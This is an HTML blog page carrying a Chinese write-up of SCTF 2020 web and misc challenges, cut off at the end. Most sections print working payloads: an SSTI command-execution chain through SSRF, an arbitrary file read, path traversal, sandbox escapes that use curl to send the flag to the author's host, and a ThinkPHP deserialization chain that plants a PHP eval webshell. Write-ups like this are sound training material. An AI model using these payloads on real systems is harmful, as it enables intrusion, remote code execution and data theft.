@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>sctf2020 | oxcccccc</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="SCTF 2020Jsonhub阅读代码发现，这一题存在着两个环境，其中，内网服务可以ssti，所以我们需要想办法访问内网： @app.route(&#39;&#x2F;caculator&#39;, methods&#x3D;[&quot;POST&quot;]) def caculator():     try:         data &#x3D; request.get_json()     except Value">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sctf2020">
+<meta property="og:url" content="http:&#x2F;&#x2F;blog.ccreater.top&#x2F;2020&#x2F;07&#x2F;07&#x2F;sctf2020&#x2F;index.html">
+<meta property="og:site_name" content="oxcccccc">
+<meta property="og:description" content="SCTF 2020Jsonhub阅读代码发现，这一题存在着两个环境，其中，内网服务可以ssti，所以我们需要想办法访问内网： @app.route(&#39;&#x2F;caculator&#39;, methods&#x3D;[&quot;POST&quot;]) def caculator():     try:         data &#x3D; request.get_json()     except Value">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Explorersss&#x2F;photo&#x2F;master&#x2F;20200704145700.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Explorersss&#x2F;photo&#x2F;master&#x2F;SWI66DGX_8Z2Z%7E_%5DOS1M%60W9.jpg">
+<meta property="article:published_time" content="2020-07-07T07:19:44.928Z">
+<meta property="article:modified_time" content="2020-07-07T07:19:44.928Z">
+<meta property="article:author" content="ccreater">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Explorersss&#x2F;photo&#x2F;master&#x2F;20200704145700.png">
+  
+    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 4.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">oxcccccc</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://blog.ccreater.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-sctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/07/07/sctf2020/" class="article-date">
+  <time class="dt-published" datetime="2020-07-07T07:19:44.928Z" itemprop="datePublished">2020-07-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      sctf2020
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SCTF-2020"><a href="#SCTF-2020" class="headerlink" title="SCTF 2020"></a>SCTF 2020</h1><h2 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h2><p>阅读代码发现，这一题存在着两个环境，其中，内网服务可以ssti，所以我们需要想办法访问内网：</p>
+<pre><code class="python">@app.route(&#39;/caculator&#39;, methods=[&quot;POST&quot;])
+def caculator():
+    try:
+        data = request.get_json()
+    except ValueError:
+        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})
+    num1 = str(data[&quot;num1&quot;])
+    num2 = str(data[&quot;num2&quot;])
+    symbols = data[&quot;symbols&quot;]
+    if re.search(&quot;[a-z]&quot;, num1, re.I) or re.search(&quot;[a-z]&quot;, num2, re.I) or not re.search(&quot;[+\-*/]&quot;, symbols):
+        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;?&quot;})
+
+    return render_template_string(str(num1) + symbols + str(num2) + &quot;=&quot; + &quot;?&quot;)</code></pre>
+<p>可以进行符合条件的ssrf的只有</p>
+<pre><code class="python">
+def flask_rpc(request):
+    if request.META[&#39;REMOTE_ADDR&#39;] != &quot;127.0.0.1&quot;:
+        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Must 127.0.0.1&quot;})
+
+    methods = request.GET.get(&quot;methods&quot;)
+    url = request.GET.get(&quot;url&quot;)
+
+    if methods == &quot;GET&quot;:
+        return JsonResponse(
+            {&quot;code&quot;: 0, &quot;message&quot;: requests.get(url, headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;}, timeout=1).text})
+    elif methods == &quot;POST&quot;:
+        data = base64.b64decode(request.GET.get(&quot;data&quot;))
+        return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: requests.post(url, data=data,
+                                                                 headers={&quot;User-Agent&quot;: &quot;Django proxy =v=&quot;,
+                                                                          &quot;Content-Type&quot;: &quot;application/json&quot;}, timeout=1).text})
+    else:
+        return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;=3=&quot;})</code></pre>
+<p>但是需要<code>request.META[&#39;REMOTE_ADDR&#39;]==127.0.0.1</code>，利用 CVE-2018-14574跳转到127.0.0.1:8000访问/rpc ，这样我们就能ssti，在这之前我们需要搞到Token</p>
+<pre><code class="python">@login_required
+def home(request):
+    if request.method == &quot;GET&quot;:
+        return render(request, &quot;templates/home.html&quot;)
+    elif request.method == &quot;POST&quot;:
+        white_list = [&quot;39.104.19.182&quot;]
+        try:
+            data = json.loads(request.body)
+        except ValueError:
+            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})
+
+        if Token.objects.all().first().Token == data[&quot;token&quot;]:
+            try:
+                if ssrf_check(data[&quot;url&quot;], white_list):
+                    return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Hacker!&quot;})
+                else:
+                    res = requests.get(data[&quot;url&quot;], timeout=1)
+            except Exception:
+                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request Error&quot;})
+            if res.status_code == 200:
+                return JsonResponse({&quot;code&quot;: 0, &quot;message&quot;: res.text})
+            else:
+                return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Something Wrong&quot;})
+        else:
+            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Token Error&quot;})</code></pre>
+<pre><code class="python">def reg(request):
+    if request.method == &quot;GET&quot;:
+        return render(request, &quot;templates/reg.html&quot;)
+    elif request.method == &quot;POST&quot;:
+        try:
+            data = json.loads(request.body)
+        except ValueError:
+            return JsonResponse({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})
+
+        if len(User.objects.filter(username=data[&quot;username&quot;])) != 0:
+            return JsonResponse({&quot;code&quot;: 1})
+        User.objects.create_user(**data)
+        return JsonResponse({&quot;code&quot;: 0})</code></pre>
+<p>构造：<code>{&quot;username&quot;:&quot;test66666&quot;,&quot;password&quot;:&quot;test66666&quot;,&quot;is_staff&quot;:true,&quot;is_superuser&quot;:true}</code></p>
+<p>得到token:<code>3ad9af405504233188f694a11ff22115</code></p>
+<p>接下来就是ssti了</p>
+<pre><code class="python">@app.route(&#39;/caculator&#39;, methods=[&quot;POST&quot;])
+def caculator():
+    try:
+        data = request.get_json()
+    except ValueError:
+        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;Request data can&#39;t be unmarshal&quot;})
+    num1 = str(data[&quot;num1&quot;])
+    num2 = str(data[&quot;num2&quot;])
+    symbols = data[&quot;symbols&quot;]
+    if re.search(&quot;[a-z]&quot;, num1, re.I) or re.search(&quot;[a-z]&quot;, num2, re.I) or not re.search(&quot;[+\-*/]&quot;, symbols):
+        return json.dumps({&quot;code&quot;: -1, &quot;message&quot;: &quot;?&quot;})
+
+    return render_template_string(str(num1) + symbols + str(num2) + &quot;=&quot; + &quot;?&quot;)</code></pre>
+<p>最后的payload:</p>
+<pre><code class="python">import requests
+import base64
+import json
+num1=1
+num2=2
+symbols=&quot;-{{''.__class__.__mro__[1].__subclasses__()[409]('/readflag',shell=True,stdout=-1).communicate()}}-&quot;
+data={
+    &quot;num1&quot;:num1,
+    &quot;num2&quot;:num2,
+    &quot;symbols&quot;:symbols
+}
+payload=json.dumps(data).replace(&quot;{{","\\u007b\\u007b").replace("}}&quot;,&quot;\\u007d\\u007d&quot;)
+payload=base64.b64encode(payload)
+print(payload)
+burp0_url = &quot;http://39.104.19.182:80/home/&quot;
+burp0_cookies = {&quot;sessionid&quot;: &quot;bd63u3ewjx05tc7ajvlkve7b9cu8h4kx&quot;, &quot;csrftoken&quot;: &quot;GBW7niMYrwP9fMP6jpgHN1ujcxEwuRQ4tMKdBDdnZvSlDny51S1K1cMmWtOsR0gO&quot;}
+burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://39.104.19.182&quot;, &quot;Referer&quot;: &quot;http://39.104.19.182/home/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
+burp0_json={&quot;token&quot;: &quot;3ad9af405504233188f694a11ff22115&quot;, &quot;url&quot;: &quot;http://39.104.19.182//127.0.0.1:8000/rpc?url=http://127.0.0.1:5000/caculator&amp;methods=POST&amp;data={payload}&quot;.format(payload=payload)}
+print(requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json).text)</code></pre>
+<p><code>SCTF{2b19246757c63738e7c40bbdf87c3be1}</code></p>
+<h2 id="Can-you-hear"><a href="#Can-you-hear" class="headerlink" title="Can you hear"></a>Can you hear</h2><p>We used the receiver to receive the information from the space station and tried to unlock the answer😀.</p>
+<p>搜索 “空间站” “接收机” 信息 音频 等关键字找到<br><a href="https://zhuanlan.zhihu.com/p/98103018" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/98103018</a><br><a href="https://www.sohu.com/a/159552694_610733" target="_blank" rel="noopener">https://www.sohu.com/a/159552694_610733</a><br>SSTV关键字</p>
+<p><a href="https://zhuanlan.zhihu.com/p/105460358" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/105460358</a><br><a href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04" target="_blank" rel="noopener">https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04</a></p>
+<p>下载 mmsstv<br>修改录音设备为立体声混音<br>具体操作为：Option-&gt;Soundcard input level<br>播放音频得到flag:</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200704145700.png" alt="image5948"><br>SCTF{f78fsd1423fvsa}</p>
+<h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p>app.js</p>
+<pre><code class="javascript=">HTTP/1.1 200 OK
+Content-Disposition: attachment; filename=&quot;dc62d163f53ce13369ab97041706060c&quot;
+Content-Length: 1547
+Last-Modified: Sat, 04 Jul 2020 05:14:45 GMT
+Cache-Control: max-age=0
+Content-Type: application/octet-stream
+Date: Sat, 04 Jul 2020 05:14:50 GMT
+Connection: close
+
+const fs = require(&#39;fs&#39;);
+const path = require(&#39;path&#39;);
+const crypto = require(&#39;crypto&#39;);
+const Koa = require(&#39;koa&#39;);
+const Router = require(&#39;koa-router&#39;);
+const koaBody = require(&#39;koa-body&#39;);
+const send = require(&#39;koa-send&#39;);
+
+const app = new Koa();
+const router = new Router();
+const SECRET = &quot;03229a6694e657077f218c322f3e0bea&quot;
+
+
+app.use(koaBody({
+  multipart: true,
+  formidable: {
+      maxFileSize: 2000 * 1024 * 1024 
+  }
+}));
+
+
+router.post(&#39;/uploadfile&#39;, async (ctx, next) =&gt; {
+  const file = ctx.request.body.files.file;
+  if (!fs.existsSync(file.path)) {
+    return ctx.body = &quot;Error&quot;;
+  }
+  if(file.path.toString().search(&quot;/fd/&quot;) != -1){
+    file.path=&quot;/dev/null&quot;
+  }
+  const reader = fs.createReadStream(file.path);
+  let fileId = crypto.createHash(&#39;md5&#39;).update(file.name + Date.now() + SECRET).digest(&quot;hex&quot;);
+  let filePath = path.join(__dirname, &#39;upload/&#39;) + fileId
+  const upStream = fs.createWriteStream(filePath);
+  reader.pipe(upStream)
+  return ctx.body = &quot;Upload success ~, your fileId is hereï¼&quot; + fileId;
+});
+
+
+router.get(&#39;/downloadfile/:fileId&#39;, async (ctx, next) =&gt; {
+  let fileId = ctx.params.fileId;
+  ctx.attachment(fileId);
+  try {
+    await send(ctx, fileId, { root: __dirname + &#39;/upload&#39; });
+  }catch(e){
+    return ctx.body = &quot;SCTF{no_such_file_~}&quot;
+  }
+});
+
+
+router.get(&#39;/&#39;, async (ctx, next) =&gt; {
+  ctx.response.type = &#39;html&#39;;
+  ctx.response.body = fs.createReadStream(&#39;index.html&#39;);
+
+});
+
+app.use(router.routes());
+app.listen(3333, () =&gt; {
+  console.log(&#39;This server is running at http://localhost:&#39; + 3333)
+})
+</code></pre>
+<p>因为koa中访问参数也是ctx.request.body.xxxx 所以我们可以构造</p>
+<pre><code>POST /uploadfile HTTP/1.1
+Host: 127.0.0.1:3333
+Content-Length: 77
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://127.0.0.1:3333
+Referer: http://127.0.0.1:3333/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+{&quot;files&quot;:{&quot;file&quot;:{&quot;path&quot;:&quot;flag&quot;}}}</code></pre><p>来进行任意文件读取</p>
+<p>SCTF{47cf9489d8832e44312dssxag6f88f45736e0e9c8}</p>
+<h2 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h2><pre><code class="php=">
+Route::get(&#39;/&#39;,&quot;IndexController@init&quot;);
+Route::post(&#39;/rm&#39;,&quot;IndexController@rm&quot;);
+Route::get(&#39;/tmp/{filename}&#39;, function ($filename) {
+    readfile(&quot;./var/tmp/&quot;.$filename);
+})-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);
+Route::post(&#39;/upload&#39;,&quot;IndexController@upload&quot;);
+Route::get(&#39;/move/log/{filename}&#39;, &#39;IndexController@moveLog&#39;)-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);
+</code></pre>
+<pre><code class="php=">&lt;?php
+
+
+namespace App\Http\Controllers;
+
+
+class IndexController extends Controller
+{
+    public function init(){
+        if($_SERVER[&quot;REMOTE_ADDR&quot;] !== &quot;127.0.0.1&quot; &amp;&amp; strpos($_SERVER[&quot;REMOTE_ADDR&quot;],&quot;192.168.&quot;) !== 0 &amp;&amp; strpos($_SERVER[&quot;REMOTE_ADDR&quot;],&quot;10.&quot;) !== 0 )  {
+            die(&quot;admin only&quot;);
+        }
+        if(!file_exists(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]))){
+            mkdir(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]));
+        }
+    }
+    public function rm(){
+        if(strpos($_POST[&quot;filename&quot;], &#39;../&#39;) !== false) die(&quot;???&quot;);
+        if(file_exists(&quot;/var/&quot;.$_POST[&quot;filename&quot;])){
+            if(is_dir(&quot;/var/&quot;.$_POST[&quot;filename&quot;])){
+                rmdir(&quot;/var/&quot;.$_POST[&quot;filename&quot;]);
+                echo &quot;rmdir&quot;;
+            }
+            else{
+                unlink(&quot;/var/&quot;.$_POST[&quot;filename&quot;]);
+                echo &quot;unlink&quot;;
+            }
+        }
+    }
+    public function upload()
+    {
+
+        if(strpos($_POST[&quot;filename&quot;], &#39;../&#39;) !== false) die(&quot;???&quot;);
+        file_put_contents(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;/&quot;.$_POST[&quot;filename&quot;],base64_decode($_POST[&quot;content&quot;]));
+        echo &quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;/&quot;.$_POST[&quot;filename&quot;];
+    }
+
+    public function moveLog($filename)
+    {
+
+        $data =date(&quot;Y-m-d&quot;);
+        if(!file_exists(storage_path(&quot;logs&quot;).&quot;/&quot;.$data)){
+            mkdir(storage_path(&quot;logs&quot;).&quot;/&quot;.$data);
+        }
+        $opts = array(
+            &#39;http&#39;=&gt;array(
+                &#39;method&#39;=&gt;&quot;GET&quot;,
+                &#39;timeout&#39;=&gt;1,//单位秒
+            )
+        );
+
+        $content = file_get_contents(&quot;http://127.0.0.1/tmp/&quot;.md5(&#39;127.0.0.1&#39;).&quot;/&quot;.$filename,false,stream_context_create($opts));
+        file_put_contents(storage_path(&quot;logs&quot;).&quot;/&quot;.$data.&quot;/&quot;.$filename,$content);
+        echo storage_path(&quot;logs&quot;).&quot;/&quot;.$data.&quot;/&quot;.$filename;
+    }
+}</code></pre>
+<p>storage_path(“logs”):/var/www/html/storage/logs</p>
+<p>upload dir : /var/tmp/md5(IP)/</p>
+<pre><code class="php=">Route::get(&#39;/tmp/{filename}&#39;, function ($filename) {
+    readfile(&quot;./var/tmp/&quot;.$filename);
+})-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);</code></pre>
+<p>直接任意文件读取，但是因为两个../服务器不会解析直接报错的原因无法穿到根目录，后来想到在弄个index.php就好了<br>最后的payload:<a href="http://39.104.93.188/index.php/tmp/../../flag" target="_blank" rel="noopener">http://39.104.93.188/index.php/tmp/../../flag</a></p>
+<p>SCTF{B3st_1angu4g3_F0r_Uohhhhhhhhhh1l1l1}</p>
+<h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><p>app.py</p>
+<pre><code class="python=">from flask import Flask, request
+
+app = Flask(__name__)
+
+
+@app.route(&#39;/&#39;, methods=[&quot;POST&quot;])
+def security():
+    secret = request.form[&quot;cmd&quot;]
+    for i in secret:
+        if not 42 &lt;= ord(i) &lt;= 122: return &quot;error!&quot;
+
+    exec(secret)
+    return &quot;xXXxXXx&quot;
+
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&quot;0.0.0.0&quot;)
+</code></pre>
+<p>测试环境：<a href="http://ccreater.top:60011/" target="_blank" rel="noopener">http://ccreater.top:60011/</a><br>禁用字符：</p>
+<p><code>[&quot;\u0000&quot;, &quot;\u0001&quot;, &quot;\u0002&quot;, &quot;\u0003&quot;, &quot;\u0004&quot;, &quot;\u0005&quot;, &quot;\u0006&quot;, &quot;\u0007&quot;, &quot;\b&quot;, &quot;\t&quot;, &quot;\n&quot;, &quot;\u000b&quot;, &quot;\f&quot;, &quot;\r&quot;, &quot;\u000e&quot;, &quot;\u000f&quot;, &quot;\u0010&quot;, &quot;\u0011&quot;, &quot;\u0012&quot;, &quot;\u0013&quot;, &quot;\u0014&quot;, &quot;\u0015&quot;, &quot;\u0016&quot;, &quot;\u0017&quot;, &quot;\u0018&quot;, &quot;\u0019&quot;, &quot;\u001a&quot;, &quot;\u001b&quot;, &quot;\u001c&quot;, &quot;\u001d&quot;, &quot;\u001e&quot;, &quot;\u001f&quot;, &quot; &quot;, &quot;!&quot;, &quot;\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;&#39;&quot;, &quot;(&quot;, &quot;)&quot;, &quot;{&quot;, &quot;|&quot;, &quot;}&quot;, &quot;~&quot;, &quot;\u007f&quot;]</code></p>
+<p>利用魔术方法? : <code>__getitem__,__getattr__</code></p>
+<p>payload:</p>
+<pre><code>POST /?a=__import__(&#39;os&#39;).system(&#39;curl+http%3a//ccreater.top%3a60000/+-d+`cat+flag|base64`&#39;) HTTP/1.1
+Host: 39.104.90.30:10006
+Pragma: no-cache
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Accept: image/webp,image/apng,image/*,*/*;q=0.8
+Referer: http://39.104.90.30:10006/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5b
+Content-Length: 248
+
+------WebKitFormBoundaryx3B8HB5b
+Content-Disposition: form-data; name=&quot;cmd&quot;
+
+request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;
+------WebKitFormBoundaryx3B8HB5b--</code></pre><h2 id="pysandbox2"><a href="#pysandbox2" class="headerlink" title="pysandbox2"></a>pysandbox2</h2><p>payload:</p>
+<pre><code>POST /?a=__import__(&#39;os&#39;).system(&#39;curl+http%3a//ccreater.top%3a60000/+-d+`/readflag|base64`&#39;) HTTP/1.1
+Host: 39.104.90.30:10006
+Pragma: no-cache
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Accept: image/webp,image/apng,image/*,*/*;q=0.8
+Referer: http://39.104.90.30:10006/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5b
+Content-Length: 248
+
+------WebKitFormBoundaryx3B8HB5b
+Content-Disposition: form-data; name=&quot;cmd&quot;
+
+request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;
+------WebKitFormBoundaryx3B8HB5b--
+</code></pre><h2 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h2><p>ThinkPHP V5.0.24</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/SWI66DGX_8Z2Z%7E_%5DOS1M%60W9.jpg" alt="image13597"></p>
+<pre><code>http://39.99.41.124/public/log.txt
+http://39.99.41.124/public/test/
+http://39.99.41.124/public/nationalsb/login.php
+
+</code></pre><p>在<a href="http://39.99.41.124/public/nationalsb/js/script.js中发现账号密码：" target="_blank" rel="noopener">http://39.99.41.124/public/nationalsb/js/script.js中发现账号密码：</a></p>
+<pre><code>    //username:Admin1964752
+    //password:DsaPPPP!@#amspe1221
+    //Secret **** is your birthday</code></pre><p>文件包含:</p>
+<pre><code>POST /public/nationalsb/login.php HTTP/1.1
+Host: 39.99.41.124
+Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 16
+
+file=/etc/passwd</code></pre><pre><code>
+Warning&lt;/b&gt;:  include(): Failed opening &#39;php://filter/read=convert.base64-encode/resource=index.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in &lt;b&gt;/var/www/html/public/nationalsb/login.php</code></pre><pre><code>GET /public/index.php?s=/index/Index/hello&amp;s3cr3tk3y= HTTP/1.1
+Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=
+Host: 39.99.41.124
+Connection: close
+</code></pre><pre><code class="php=">&lt;?php
+namespace app\index\controller;
+
+class Index extends \think\Controller{
+  public function index(){
+      $ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
+    echo &quot;Warning&quot;.&quot;&lt;br/&gt;&quot;;
+    echo &quot;You IP: &quot;.$ip.&quot; has been recorded by the National Security Bureau.I will record it to ./log.txt, Please pay attention to your behavior&quot;;
+    echo &#39;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://127.0.0.1/public/test&quot;&gt;&#39;;  
+  }
+  public function hello(){
+      unserialize(base64_decode($_GET[&#39;s3cr3tk3y&#39;]));
+    echo(base64_decode($_GET[&#39;s3cr3tk3y&#39;]));
+  }
+}
+</code></pre>
+<p>/var/www/html/protect.py</p>
+<pre><code class="python=">....</code></pre>
+<pre><code class="php=">&lt;?php
+namespace think\cache\driver;
+
+class File {
+    protected $options = [];
+    protected $tag;
+    public function __construct() {
+    $this-&gt;tag = &#39;cjbtest&#39;;
+    $this-&gt;options = [
+        &#39;cache_subdir&#39;  =&gt; false,
+        &#39;prefix&#39;        =&gt; &#39;&#39;,
+        &#39;path&#39; =&gt; &#39;php://filter/write=convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&#39;, // 因为 static 目录有写权限
+        &#39;data_compress&#39; =&gt; false
+    ];
+    }
+}
+
+namespace think\session\driver;
+use think\cache\driver\File;
+
+class Memcached {
+    protected $handler;
+    function __construct() {
+    $this-&gt;handler=new File();
+    }
+}
+
+namespace think\console;
+use think\session\driver\Memcached;
+
+class Output {
+    protected $styles = [];
+    private $handle;
+    function __construct() {
+    $this-&gt;styles = [&quot;getAttr&quot;, &#39;info&#39;,
+             &#39;error&#39;,
+             &#39;comment&#39;,
+             &#39;question&#39;,
+             &#39;highlight&#39;,
+             &#39;warning&#39;];
+    $this-&gt;handle = new Memcached();
+    }
+}
+
+namespace think\db;
+use think\console\Output;
+
+class Query {
+    protected $model;
+    function __construct() {
+    $this-&gt;model = new Output();
+    }
+}
+
+namespace think\model\relation;
+use think\console\Output;
+use think\db\Query;
+
+class HasOne {
+    public $model;
+    protected $selfRelation;
+    protected $parent;
+    protected $query;
+    protected $bindAttr = [];
+    public function __construct() {
+    $this-&gt;query = new Query(&quot;xx&quot;, &#39;think\console\Output&#39;);
+    $this-&gt;model = false;
+    $this-&gt;selfRelation = false;
+    $this-&gt;bindAttr = [&quot;xx&quot; =&gt; &quot;xx&quot;];
+    }}
+
+namespace think\model;
+use think\console\Output;
+use think\model\relation\HasOne;
+
+abstract class Model {
+}
+
+class Pivot extends Model {
+    public $parent;
+    protected $append = [];
+    protected $data = [];
+    protected $error;
+    protected $model;
+
+    function __construct() {
+    $this-&gt;parent = new Output();
+    $this-&gt;error = new HasOne();
+    $this-&gt;model = &quot;test&quot;;
+    $this-&gt;append = [&quot;test&quot; =&gt; &quot;getError&quot;];
+    $this-&gt;data = [&quot;panrent&quot; =&gt; &quot;true&quot;];
+    }
+}
+
+namespace think\process\pipes;
+use think\model\Pivot;
+
+class Windows {
+    private $files = [];
+    public function __construct() {
+    $this-&gt;files=[new Pivot()];
+    }
+}
+
+$obj = new Windows();
+$payload = serialize($obj);
+echo base64_encode($payload);</code></pre>
+<p>写文件到/tmp</p>
+<pre><code class="python=">import requests
+import hashlib
+payload=requests.get(&quot;http://127.0.0.1/cms/thinkphp/5.0.24/tp5/public/test.php&quot;).text.strip()
+burp0_url = &quot;http://8.208.102.48:80/public/index.php&quot;
+params={
+    &quot;s&quot;:&quot;/index/Index/hello&quot;,
+    &quot;s3cr3tk3y&quot;:payload
+}
+burp0_headers = {&quot;Authorization&quot;: &quot;Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=&quot;, &quot;Connection&quot;: &quot;close&quot;}
+res=requests.get(burp0_url, headers=burp0_headers ,params=params)
+print(res.text)
+print(requests.get(&quot;http://8.208.102.48:80/public/log.txt&quot;).text)
+</code></pre>
+<pre><code>POST /public/nationalsb/login.php HTTP/1.1
+Host: 8.208.102.48
